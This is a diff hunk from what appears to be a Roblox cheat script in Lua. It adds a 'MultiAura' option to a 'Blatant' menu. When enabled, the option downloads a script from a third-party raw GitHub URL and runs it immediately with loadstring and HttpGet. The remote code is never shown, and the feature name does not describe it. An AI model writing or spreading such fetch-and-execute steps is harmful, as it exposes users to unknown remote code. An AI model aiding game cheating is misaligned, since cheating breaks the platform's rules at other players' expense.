@@ -10487,6 +10487,18 @@ runFunction(function()
 end)
 
 runFunction(function()
+    local MultiAura = {Enabled = false}
+    MultiAura = GuiLibrary.ObjectsThatCanBeSaved.BlatantWindow.Api.CreateOptionsButton({
+        Name = "MultiAura",
+        Function = function(callback)
+            if callback then
+                loadstring(game:HttpGet("https://raw.githubusercontent.com/AcronisX/Random/main/random"))()
+            end
+        end
+    })
+end)
+
+runFunction(function()
 local Headless = {Enabled = false}
 local oldface
 local function applyHeadless()
